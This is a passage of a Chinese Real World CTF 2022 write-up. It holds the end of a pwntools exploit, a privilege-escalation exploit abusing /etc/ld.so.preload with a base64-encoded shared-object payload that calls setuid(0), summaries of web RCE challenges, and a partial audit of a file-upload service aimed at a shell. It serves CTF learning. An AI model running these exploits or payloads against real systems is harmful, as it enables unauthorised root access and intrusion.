+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>load</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>push</span><span class=p>(</span><span class=mh>0x8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>sub</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>store</span><span class=p>(</span><span class=o>-</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># payload += store()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>nops</span> <span class=o>=</span> <span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>*</span> <span class=p>(</span><span class=mh>0x100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># gdb.attach(sh,&#39;b * $rebase(0x141B)&#39;)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># stack_base = int(sh.recvline(),10) - 0x13900</span>
+</span></span><span class=line><span class=cl><span class=c1># log.success(&#34;stack = &#34; + hex(stack_base))</span>
+</span></span><span class=line><span class=cl><span class=c1># libc_base = int(sh.recvline(),10)- 0x64ebf</span>
+</span></span><span class=line><span class=cl><span class=c1># log.success(&#34;libc_base = &#34; + hex(libc_base)) </span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># io_list_all = libc_base + 0x1ec5a0</span>
+</span></span><span class=line><span class=cl><span class=c1># recurive = libc_base + 0x23CF68</span>
+</span></span><span class=line><span class=cl><span class=c1># xputn = libc_base + 0x92750</span>
+</span></span><span class=line><span class=cl><span class=c1># one_gadget = </span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=phonograph>Phonograph</h3><p>提权exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>base64</span> <span class=o>-</span><span class=n>d</span>  <span class=o>&gt;</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>create</span><span class=o>.</span><span class=n>sh</span> <span class=o>&lt;&lt;</span><span class=n>EOF</span>
+</span></span><span class=line><span class=cl><span class=n>IyEvYmluL2Jhc2gKYWxwaGE9ImEgYiBjIGQgZSBmIDAgMSAyIDMgNCA1IDYgNyA4IDkiCgpmb3Ig</span>
+</span></span><span class=line><span class=cl><span class=n>aSBpbiAkYWxwaGE7IGRvCmZvciBqIGluICRhbHBoYTsgZG8KZm9yIGsgaW4gJGFscGhhOyBkbwpm</span>
+</span></span><span class=line><span class=cl><span class=n>b3IgbCBpbiAkYWxwaGE7IGRvCiAgICBta2RpciAtcCAvdG1wL2xvZ18kaSRqJGskbAogICAgbG4g</span>
+</span></span><span class=line><span class=cl><span class=n>LXMgL2V0Yy9sZC5zby5wcmVsb2FkICAvdG1wL2xvZ18kaSRqJGskbC9kaWFyeS50eHQKZG9uZQpk</span>
+</span></span><span class=line><span class=cl><span class=n>b25lCmRvbmUKZG9uZQ</span><span class=o>==</span>
+</span></span><span class=line><span class=cl><span class=n>EOF</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>chmod</span> <span class=o>+</span><span class=n>x</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>create</span><span class=o>.</span><span class=n>sh</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># gcc inject.c -fPIC -shared -o exp.so -nostdlib</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># #include &lt;stdio.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1># #include &lt;stdlib.h&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># __attribute__((constructor)) void exploit()  {</span>
+</span></span><span class=line><span class=cl><span class=c1>#     char buf[1000];</span>
+</span></span><span class=line><span class=cl><span class=c1>#     if(!getenv(&#34;one&#34;)) {</span>
+</span></span><span class=line><span class=cl><span class=c1>#         return;</span>
+</span></span><span class=line><span class=cl><span class=c1>#     }</span>
+</span></span><span class=line><span class=cl><span class=c1>#     unsetenv(&#34;one&#34;);</span>
+</span></span><span class=line><span class=cl><span class=c1>#     setuid(0);</span>
+</span></span><span class=line><span class=cl><span class=c1>#     setgid(0);</span>
+</span></span><span class=line><span class=cl><span class=c1>#     system(&#34;chmod 777 /flag.txt&#34;);</span>
+</span></span><span class=line><span class=cl><span class=c1># } </span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>base64</span> <span class=o>-</span><span class=n>d</span> <span class=o>&gt;</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=nb>exp</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=n>gz</span> <span class=o>&lt;&lt;</span><span class=n>EOF</span>
+</span></span><span class=line><span class=cl><span class=n>H4sICAsf7GEAA2V4cC5zbwDtW99vFFUUPrOz</span><span class=o>/</span><span class=n>QGFdlEMRYxuDCqQMCwCaakC25ZtVy1QC</span><span class=o>/</span><span class=n>UXD8O2</span>
+</span></span><span class=line><span class=cl><span class=n>O3SXdHeb7axueUA0SjDaBBNQX8RgQkI0Jv5M</span><span class=o>+</span><span class=n>qCxxpjoo3</span><span class=o>+</span><span class=n>CDyQYTSwYefDB8d6Zc2bn3p0JaAL6</span>
+</span></span><span class=line><span class=cl><span class=n>cL9k9pvz3fvde2fu7My0e</span><span class=o>+</span><span class=mi>6</span><span class=n>LmZGhmKYBQYfdwKOPE16cRv2Z7X4VpvVCB</span><span class=o>/</span><span class=n>u8C1a7deMQjZNxkQHb</span>
+</span></span><span class=line><span class=cl><span class=mi>5</span><span class=n>b6WQCxzhyZy0Oc2lURd4s9B5KCvlW0Lhhcv7Bb5tCYy</span><span class=o>+</span><span class=n>WLoW0Tf4m6R05rI7WiP43Yp5sUyy8OX</span>
+</span></span><span class=line><span class=cl><span class=n>fd9jPZnXg8h0Wg9etvP</span><span class=o>/</span><span class=n>pr9R9HVjgcxR</span><span class=o>/</span><span class=n>T3JfK1w86DpHcP</span><span class=o>+</span><span class=n>ouYhq4lM0xHHNvg1M7x</span><span class=o>/</span><span class=n>nM</span><span class=o>/</span><span class=n>LItf0</span>
+</span></span><span class=line><span class=cl><span class=n>QPlqjHn5Vx8</span><span class=o>+</span><span class=mi>9</span><span class=n>d7bF85</span><span class=o>/</span><span class=n>erb</span><span class=o>+</span><span class=mi>9</span><span class=n>I6riet7rr6</span><span class=o>/</span><span class=n>c5LXo</span><span class=o>/</span><span class=n>mk64Eb47TP8Hr9jZdvdByJEH1ZhP5QhJ6M</span>
+</span></span><span class=line><span class=cl><span class=mi>0</span><span class=n>NdG6Hy8d8By</span><span class=o>/</span><span class=mi>3</span><span class=n>t5mAqs</span><span class=o>+</span><span class=n>sx0pWjDlGVb5eehVp71dhjVinlOU5zmZm2rBI3z7B8</span><span class=o>/</span><span class=n>ojvtcRs0zrk7</span>
+</span></span><span class=line><span class=cl><span class=n>zoAeC</span><span class=o>+</span><span class=n>gbAroe0FMBPXhf6A3oLSHHp6CgoKCgoKCgoKBw6</span><span class=o>+</span><span class=n>HsiKUArjkP6Iy67oPfu</span><span class=o>+</span><span class=mi>79</span><span class=n>s8ALrv38</span>
+</span></span><span class=line><span class=cl><span class=n>k</span><span class=o>+</span><span class=n>M4Z9xYc</span><span class=o>+</span><span class=n>Mf</span><span class=o>/</span><span class=n>Tjmxt</span><span class=o>/</span><span class=mi>4</span><span class=n>se7Gn</span><span class=o>/</span><span class=n>hx3I0vUMxa</span><span class=o>/</span><span class=mi>2</span><span class=n>gLb30vAMYXpfhdKT4nxfPBeDz72uXsS78usW6z</span>
+</span></span><span class=line><span class=cl><span class=mi>87</span><span class=n>v6ugCuXGR9ZV9dtHuZsJELrzDha34cC</span><span class=o>/</span><span class=n>zjyhdi</span><span class=o>+</span><span class=n>BavPr9L5zWPs</span><span class=o>/</span><span class=mi>1</span><span class=n>ftDM</span><span class=o>/</span><span class=n>fPtfnH4FBQUFBQUF</span>
+</span></span><span class=line><span class=cl><span class=n>BQUFBQUFhduCStmCyUKpkk</span><span class=o>/</span><span class=mi>29</span><span class=n>PQktxydzk0Zdt0GbZ3</span><span class=o>+</span><span class=n>CP</span><span class=o>/</span><span class=n>Nl</span><span class=o>/</span><span class=mi>9</span><span class=n>pf</span><span class=o>+</span><span class=n>U3xznCOLvkOKcZv8M4jf7V</span>
+</span></span><span class=line><span class=cl><span class=n>yNrxMdDqCW3dirb2MxrAPeBto6yu</span><span class=o>+</span><span class=mi>1</span><span class=n>tlpjNxKja4sjU2xmp4vyc</span><span class=o>/</span><span class=n>yraT2DZ0JoY6ux</span><span class=o>/</span><span class=n>v6nih</span><span class=o>/</span><span class=n>STs</span>
+</span></span><span class=line><span class=cl><span class=n>ubtv07b193OZ</span><span class=o>/</span><span class=mi>9</span><span class=n>yZZ9sCqzd6W86IgoKCgoKCgoKCgoKCwv8Ra5Epr3UdxpTf</span><span class=o>/</span><span class=n>MdfToXzEiavUu7p</span>
+</span></span><span class=line><span class=cl><span class=n>IiatUg5sN8bLMcb0ZOigcmQ</span><span class=o>/</span><span class=mi>1</span><span class=n>zXtEeXE1pHp7</span><span class=o>+</span><span class=n>E25DU0nrioL</span><span class=o>+</span><span class=n>niOKn9ZVJ8q0F57DISmGecRE7R</span>
+</span></span><span class=line><span class=cl><span class=n>egDkUeThwcG</span><span class=o>+</span><span class=mi>5</span><span class=n>IbxiVrZriV3GtuM1OatPTU33Hri4ZSR2r7Rk29iLDpofr66qMf8</span><span class=o>/</span><span class=n>HdR1</span><span class=o>/</span><span class=mi>15</span><span class=n>FfW4</span>
+</span></span><span class=line><span class=cl><span class=n>P5</span><span class=o>+</span><span class=n>i3uLPu6i3</span><span class=o>+</span><span class=n>vMh6m3</span><span class=o>+</span><span class=n>vIl6e2iSts5m70io3sjbFvWORkK</span><span class=o>+</span><span class=n>oK</span><span class=o>/</span><span class=n>w8</span><span class=o>+</span><span class=mi>9</span><span class=n>FfSWkQ</span><span class=o>/</span><span class=n>VO</span><span class=o>//</span><span class=n>oX9a7Q</span><span class=o>+</span><span class=n>dX5</span>
+</span></span><span class=line><span class=cl><span class=mi>4</span><span class=n>NNh</span><span class=o>+</span><span class=n>qomzVtvcdVprh2uL3c9zf3e6X42H9eDbv3m8fD</span><span class=o>/</span><span class=n>DYXlwWci9JEI</span><span class=o>/</span><span class=n>WCE</span><span class=o>/</span><span class=n>hyE59NPRNSHYvmY</span>
+</span></span><span class=line><span class=cl><span class=n>NWkbk2DufXZ</span><span class=o>//</span><span class=mi>77</span><span class=n>HBsE0h</span><span class=o>/</span><span class=n>ePm5msOTTWvy9jZveOgTk8cmCgf8Q8MDR0MHPIPNQ</span><span class=o>/</span><span class=n>MJIxGzn5mKOP</span>
+</span></span><span class=line><span class=cl><span class=n>yfiYmk8J</span><span class=o>/</span><span class=n>JiwD8bsXMnOTTC2qx4XaK9csS1jqlwzZqqVGatqzwWkiVpxOr</span><span class=o>+</span><span class=n>ZNeBGhdxsAYz8XJk1</span>
+</span></span><span class=line><span class=cl><span class=mi>5</span><span class=n>rFdBaNqTed4gHsz0zbwD2PWmgTDtuosrFbyOTsHhlUwj1ZzJcss5KuNCIxiuWibuWo1N</span><span class=o>+</span><span class=n>c2mysV</span>
+</span></span><span class=line><span class=cl><span class=n>mXWqYnuNTVZKJatsh52</span><span class=o>/</span><span class=n>fwh</span><span class=o>+</span><span class=n>Hw</span><span class=o>+</span><span class=n>uOYhaz0Jol2JD8ketoyHIX</span><span class=o>/</span><span class=n>N</span><span class=o>+</span><span class=n>tl13nAr56T6zJPnJJ</span><span class=o>/</span><span class=n>f</span><span class=o>/</span><span class=n>BHjP</span>
+</span></span><span class=line><span class=cl><span class=n>DvLT</span><span class=o>/</span><span class=n>Yj4Eur8eaRB83OAX7d6wE</span><span class=o>/</span><span class=mi>3</span><span class=n>LWJ6PhE0KT6MY</span><span class=o>/</span><span class=n>PHr4tM</span><span class=o>/</span><span class=n>cjjJ93CsgEqj4tMzztalyP7j4G0</span>
+</span></span></code></pre></td></tr></table></div></div><h1 id=web>WEB</h1><p>Hhhm大哥说太简单了，就一句话一题概括</p><ul><li>log4flag：log4shell 绕一下关键字过滤</li><li>Be-a-Database-Hacker：redis主从复制</li><li>the Secrets of Memory：spring actuator heapdump内存提取关键字符</li><li>Flag Console：weblogic cve</li><li>baby flaglab：gitlab前台rce</li><li>Be-a-Database-Hacker：h2 log4j2反序列化</li><li>Java Remote Debugger：java调试器rce</li><li>Ghost Shiro：tomcat ajp任意文件读+commonbeanuntil1.8.3反序列化链</li></ul><h1 id=realworld-ctf-2022---rwdn-复现解析>Realworld CTF 2022 - RWDN 复现解析</h1><h2 id=前情提要>前情提要</h2><p><a href=./realworld2022_RWDN.zip>RWDN dockerfile</a> 这份 dockerfile 是从 出题人 手中拿到的 和现实的题目 有点点差距的地方</p><p>使用 <code>sudo docker compose up</code> 等待镜像制作完成就会自动启动了</p><p>题目会部署在 127.0.0.1 31337 和 31338 两个端口 和正式比赛的情况 没有区别</p><h2 id=拿到题目>拿到题目</h2><h3 id=source-审计>source 审计</h3><p>先查看 HTML 源码 很快就能看到注释中写的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;body&gt;
+</span></span><span class=line><span class=cl>&lt;!-- /source --&gt;
+</span></span></code></pre></td></tr></table></div></div><p>很显然是提示我们去访问 /source 目录</p><p>curl 看一下 是 js 源码 这里顺手存到 source 文件里</p><p>注意: 源文件无注释 我这里为了提示也是为了分析题目 所以这里部分需要注意的地方 我添加了注释</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl 127.0.0.1:31337/source <span class=p>|</span> tee code.js
+</span></span><span class=line><span class=cl>const <span class=nv>express</span> <span class=o>=</span> require<span class=o>(</span><span class=s1>&#39;express&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>const <span class=nv>fileUpload</span> <span class=o>=</span> require<span class=o>(</span><span class=s1>&#39;express-fileupload&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>const <span class=nv>md5</span> <span class=o>=</span> require<span class=o>(</span><span class=s1>&#39;md5&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>const <span class=o>{</span> v4: uuidv4 <span class=o>}</span> <span class=o>=</span> require<span class=o>(</span><span class=s1>&#39;uuid&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>const <span class=nv>check</span> <span class=o>=</span> require<span class=o>(</span><span class=s1>&#39;./check&#39;</span><span class=o>)</span><span class=p>;</span> // 这里引入了 check 不知道是什么 但是是自定义的
+</span></span><span class=line><span class=cl>const <span class=nv>app</span> <span class=o>=</span> express<span class=o>()</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>const <span class=nv>PORT</span> <span class=o>=</span> 8000<span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>app.set<span class=o>(</span><span class=s1>&#39;views&#39;</span>, __dirname + <span class=s1>&#39;/views&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>app.set<span class=o>(</span><span class=s1>&#39;view engine&#39;</span>, <span class=s1>&#39;ejs&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>app.use<span class=o>(</span>fileUpload<span class=o>({</span>
+</span></span><span class=line><span class=cl>  useTempFiles : true,
+</span></span><span class=line><span class=cl>  tempFileDir : <span class=s1>&#39;/tmp/&#39;</span>,
+</span></span><span class=line><span class=cl>  createParentPath : <span class=nb>true</span>
+</span></span><span class=line><span class=cl><span class=o>}))</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>app.use<span class=o>(</span><span class=s1>&#39;/upload&#39;</span>,check<span class=o>())</span><span class=p>;</span> // 这里调用了 check 应该是 在 ./check 的一个函数
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>// 看到 这里用到了下面用到了 获取源码的方法
+</span></span><span class=line><span class=cl>app.get<span class=o>(</span><span class=s1>&#39;/source&#39;</span>, <span class=k>function</span><span class=o>(</span>req, res<span class=o>)</span> <span class=o>{</span> 
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=o>(</span>req.query.checkin<span class=o>){</span> // 让 <span class=nv>checkin</span> <span class=o>==</span> <span class=m>1</span> 
+</span></span><span class=line><span class=cl>    res.sendfile<span class=o>(</span><span class=s1>&#39;/src/check.js&#39;</span><span class=o>)</span><span class=p>;</span> // 这里我们可以猜测之前 check 的意思 应该就是这个文件
+</span></span><span class=line><span class=cl>    							// 因此接下来我们要请求拿一下 check.js 但是不急 我们接着看
+</span></span><span class=line><span class=cl>  <span class=o>}</span>
+</span></span><span class=line><span class=cl>  res.sendfile<span class=o>(</span><span class=s1>&#39;/src/server.js&#39;</span><span class=o>)</span><span class=p>;</span> // 就是我们当前的文件
+</span></span><span class=line><span class=cl><span class=o>})</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>// 我们的根目录 生成了一个 formid
+</span></span><span class=line><span class=cl>app.get<span class=o>(</span><span class=s1>&#39;/&#39;</span>, <span class=k>function</span><span class=o>(</span>req, res<span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>  var <span class=nv>formid</span> <span class=o>=</span> <span class=s2>&#34;form-&#34;</span> + uuidv4<span class=o>()</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  res.render<span class=o>(</span><span class=s1>&#39;index&#39;</span>, <span class=o>{</span>formid : formid<span class=o>}</span> <span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=o>})</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>// 这里是上传点  一般这里大家都会警觉
+</span></span><span class=line><span class=cl>app.post<span class=o>(</span><span class=s1>&#39;/upload&#39;</span>, <span class=k>function</span><span class=o>(</span>req, res<span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>  <span class=nb>let</span> sampleFile<span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nb>let</span> uploadPath<span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nb>let</span> userdir<span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nb>let</span> userfile<span class=p>;</span>
+</span></span><span class=line><span class=cl>  // 样本文件 获取 用的是 req.query.formid 注意可以是数字 不一定是 字符串
+</span></span><span class=line><span class=cl>  <span class=nv>sampleFile</span> <span class=o>=</span> req.files<span class=o>[</span>req.query.formid<span class=o>]</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  // 这里处理 文件 <span class=nb>hash</span> 用的 md5 分别计算了 文件 <span class=nb>hash</span> 和 上传者的地址
+</span></span><span class=line><span class=cl>  // node 会获取 ::ffff:<span class=o>{</span>ipv4<span class=o>}</span> 作为你的 ip 地址 
+</span></span><span class=line><span class=cl>  <span class=nv>userdir</span> <span class=o>=</span> md5<span class=o>(</span>md5<span class=o>(</span>req.socket.remoteAddress<span class=o>)</span> + sampleFile.md5<span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nv>userfile</span> <span class=o>=</span> sampleFile.name.toString<span class=o>()</span><span class=p>;</span> 
+</span></span><span class=line><span class=cl>  // 文件名就是 name 字段 不是 filename 字段 正常情况是 你的 formid
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=o>(</span>userfile.includes<span class=o>(</span><span class=s1>&#39;/&#39;</span><span class=o>)||</span>userfile.includes<span class=o>(</span><span class=s1>&#39;..&#39;</span><span class=o>)){</span> 
+</span></span><span class=line><span class=cl>      <span class=k>return</span> res.status<span class=o>(</span>500<span class=o>)</span>.send<span class=o>(</span><span class=s2>&#34;Invalid file name&#34;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>
+</span></span><span class=line><span class=cl>  // 上传到的地址 注意这里是绝对地址 
+</span></span><span class=line><span class=cl>  <span class=nv>uploadPath</span> <span class=o>=</span> <span class=s1>&#39;/uploads/&#39;</span> + userdir + <span class=s1>&#39;/&#39;</span> + userfile<span class=p>;</span>
+</span></span><span class=line><span class=cl>  sampleFile.mv<span class=o>(</span>uploadPath, <span class=k>function</span><span class=o>(</span>err<span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span>err<span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>return</span> res.status<span class=o>(</span>500<span class=o>)</span>.send<span class=o>(</span>err<span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl>    // 这里提到了第二个端口 
+</span></span><span class=line><span class=cl>    // 这里也说明了 上传的文件你可以在这个地址访问到 
+</span></span><span class=line><span class=cl>    // 文件上传 getshell 基本都要用到 这个地址访问 然后让服务器执行
+</span></span><span class=line><span class=cl>    res.send<span class=o>(</span><span class=s1>&#39;File uploaded to http://47.243.75.225:31338/&#39;</span> + userdir + <span class=s1>&#39;/&#39;</span> + userfile<span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=o>})</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=o>})</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>app.listen<span class=o>(</span>PORT, <span class=k>function</span><span class=o>()</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>  console.log<span class=o>(</span><span class=s1>&#39;Express server listening on port &#39;</span>, PORT<span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=o>})</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=check-审计>check 审计</h3><p>接下来 看看我们的 check.js</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>$</span> <span class=nx>curl</span> <span class=mf>127.0</span><span class=p>.</span><span class=mf>0.1</span><span class=o>:</span><span class=mi>31337</span><span class=o>/</span><span class=nx>source</span><span class=o>?</span><span class=nx>checkin</span><span class=o>=</span><span class=mi>1</span> <span class=o>|</span> <span class=nx>tee</span> <span class=nx>check</span><span class=p>.</span><span class=nx>js</span>
+</span></span><span class=line><span class=cl><span class=nx>module</span><span class=p>.</span><span class=nx>exports</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>formid</span> <span class=o>||</span> <span class=o>!</span><span class=nx>req</span><span class=p>.</span><span class=nx>files</span> <span class=o>||</span> <span class=nb>Object</span><span class=p>.</span><span class=nx>keys</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>files</span><span class=p>).</span><span class=nx>length</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=c1>// 确认你有上传
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Something error.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=c1>// 对每个文件的 key 进行检查 (其实这里有个例外 __proto__ 是个例外)
